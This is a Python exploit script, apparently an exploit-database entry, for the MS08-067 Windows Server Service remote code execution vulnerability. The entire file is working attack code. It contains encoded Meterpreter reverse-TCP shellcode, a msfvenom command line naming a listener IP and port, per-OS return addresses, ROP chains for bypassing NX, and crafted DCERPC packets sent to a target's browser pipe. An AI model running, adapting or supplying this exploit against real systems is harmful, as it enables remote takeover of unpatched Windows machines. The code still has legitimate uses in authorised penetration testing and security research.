# EDB-Note: Source ~ https://raw.githubusercontent.com/ohnozzy/Exploit/master/MS08_067.py
 
import struct
import time
import sys
 
 
 
from threading import Thread    #Thread is imported incase you would like to modify
 
                                
 
 
 
try:
 
    from impacket import smb
 
    from impacket import uuid
 
    from impacket.dcerpc import dcerpc
 
    from impacket.dcerpc import transport
 
except ImportError, _:
 
    print 'Install the following library to make this script work'
 
    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'
 
    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'
 
    sys.exit(1)
 
 
 
 
 
print '#######################################################################'
 
print '#   MS08-067 Exploit'
 
print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/). '
 
print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'
 
print '#######################################################################\n'
 
 
 
 
 
#Reverse TCP shellcode from metasploit; port 443 IP 192.168.40.103; badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40; 
#Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)
#EXITFUNC=thread Important!
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x31\xc9\x83\xe9\xad\xe8\xff\xff\xff\xff\xc0\x5e\x81"
shellcode += "\x76\x0e\xc3\xdd\xfe\xc4\x83\xee\xfc\xe2\xf4\x3f\x35"
shellcode += "\x7c\xc4\xc3\xdd\x9e\x4d\x26\xec\x3e\xa0\x48\x8d\xce"
shellcode += "\x4f\x91\xd1\x75\x96\xd7\x56\x8c\xec\xcc\x6a\xb4\xe2"
shellcode += "\xf2\x22\x52\xf8\xa2\xa1\xfc\xe8\xe3\x1c\x31\xc9\xc2"
shellcode += "\x1a\x1c\x36\x91\x8a\x75\x96\xd3\x56\xb4\xf8\x48\x91"
shellcode += "\xef\xbc\x20\x95\xff\x15\x92\x56\xa7\xe4\xc2\x0e\x75"
shellcode += "\x8d\xdb\x3e\xc4\x8d\x48\xe9\x75\xc5\x15\xec\x01\x68"
shellcode += "\x02\x12\xf3\xc5\x04\xe5\x1e\xb1\x35\xde\x83\x3c\xf8"
shellcode += "\xa0\xda\xb1\x27\x85\x75\x9c\xe7\xdc\x2d\xa2\x48\xd1"
shellcode += "\xb5\x4f\x9b\xc1\xff\x17\x48\xd9\x75\xc5\x13\x54\xba"
shellcode += "\xe0\xe7\x86\xa5\xa5\x9a\x87\xaf\x3b\x23\x82\xa1\x9e"
shellcode += "\x48\xcf\x15\x49\x9e\xb5\xcd\xf6\xc3\xdd\x96\xb3\xb0"
shellcode += "\xef\xa1\x90\xab\x91\x89\xe2\xc4\x22\x2b\x7c\x53\xdc"
shellcode += "\xfe\xc4\xea\x19\xaa\x94\xab\xf4\x7e\xaf\xc3\x22\x2b"
shellcode += "\xae\xc8\x84\xae\x26\x3e\xb7\xff\xae\xc1\xb5\x14\xcb"
shellcode += "\x1c\x3d\x01\x11\x54\xb5\xfc\xc4\xd2\x81\x77\x22\xa9"
shellcode += "\xcd\xa8\x93\xab\x1f\x25\xf3\xa4\x22\x2b\x41\x03\xa8"
shellcode += "\xa6\x93\xab\x6a\x17\xfc\x3c\x22\x2b\x93\xab\xa9\x12"
shellcode += "\xff\x22\x22\x2b\x93\x54\xb5\x8b\xaa\x8e\xbc\x01\x11"
shellcode += "\xa9\xdd\x94\xc0\x95\x8a\x96\xc6\x1a\x15\xa1\x3b\x16"
shellcode += "\x5e\x06\xc4\xbd\xf0\x75\xf2\xa9\x9d\x96\xc4\xd3\xdd"
shellcode += "\xfe\x92\xa9\xdd\x96\x9c\x67\x8e\x1b\x3b\x16\x4e\xad"
shellcode += "\xae\xc3\x8b\xad\x93\xab\xdf\x27\x0c\x9c\x22\x2b\x47"
shellcode += "\x3b\xdd\x80\xc3\xc2\x1e\xd7\x02\xb6\x34\x3d\x7f\x23"
shellcode += "\xc0\xd4\xce\xab\x7b\x6b\x79\x5e\x22\x2b\xf8\xc5\xa1"
shellcode += "\xf4\x44\x38\x3d\x8b\xc1\x78\x9a\xed\xb6\xac\xb7\xfe"
shellcode += "\x97\x3c\x08\xfe\xc4"

 
nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
module_base = 0x6f880000
def generate_rop(rvas):
    gadget1="\x90\x5a\x59\xc3"
    gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]  
    gadget3="\xcc\x90\xeb\x5a" 
    ret=struct.pack('<L', 0x00018000)
    ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)
    ret+=struct.pack('<L', 0x01040110)
    ret+=struct.pack('<L', 0x01010101)
    ret+=struct.pack('<L', 0x01010101)
    ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)
    ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
    ret+=gadget1
    ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)
    ret+=struct.pack('<L', rvas['jmp eax']+module_base)
    ret+=gadget2[0]
    ret+=gadget2[1]
    ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)
    ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
    ret+=gadget2[2]
    ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)
    ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)
    ret+=struct.pack('<L', rvas['jmp eax']+module_base)
    ret+=gadget3    
    return ret
class SRVSVC_Exploit(Thread):
 
    def __init__(self, target, os, port=445):
 
        super(SRVSVC_Exploit, self).__init__()
 
        self.__port   = port
 
        self.target   = target
        self.os       = os
     
 
    def __DCEPacket(self):
        if (self.os=='1'):
            print 'Windows XP SP0/SP1 Universal\n'
            ret = "\x61\x13\x00\x01"
            jumper = nonxjmper % (ret, ret)
        elif (self.os=='2'):
            print 'Windows 2000 Universal\n'
            ret = "\xb0\x1c\x1f\x00"
            jumper = nonxjmper % (ret, ret)
        elif (self.os=='3'):
            print 'Windows 2003 SP0 Universal\n'
            ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
            jumper = nonxjmper % (ret, ret)
        elif (self.os=='4'):
            print 'Windows 2003 SP1 English\n'
            ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
        elif (self.os=='5'):
            print 'Windows XP SP3 French (NX)\n'
            ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07 
            disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2 
            jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
        elif (self.os=='6'):
            print 'Windows XP SP3 English (NX)\n'
            ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07 
            disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2 
            jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
        elif (self.os=='7'):
            print 'Windows XP SP3 English (AlwaysOn NX)\n'
            rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}
            jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
        else:
            print 'Not supported OS version\n'
            sys.exit(-1)
        print '[-]Initiating connection'
 
        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
 
        self.__trans.connect()
 
        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target
 
        self.__dce = self.__trans.DCERPC_class(self.__trans)
 
        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
 
 
 
 
        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + shellcode +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2
 
        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
 
        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"
 
        return
 
 
 
    def run(self):
 
        self.__DCEPacket()
 
        self.__dce.call(0x1f, self.__stub) 
        time.sleep(5)
        print 'Exploit finish\n'
 
 
 
if __name__ == '__main__':
 
       try:
 
        target = sys.argv[1]
        os = sys.argv[2]
 
       except IndexError:
 
            print '\nUsage: %s <target ip>\n' % sys.argv[0]
 
            print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
            print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'
 
            sys.exit(-1)
 
             
 
current = SRVSVC_Exploit(target, os)
 
current.start()

#  0day.today [2018-04-08]  #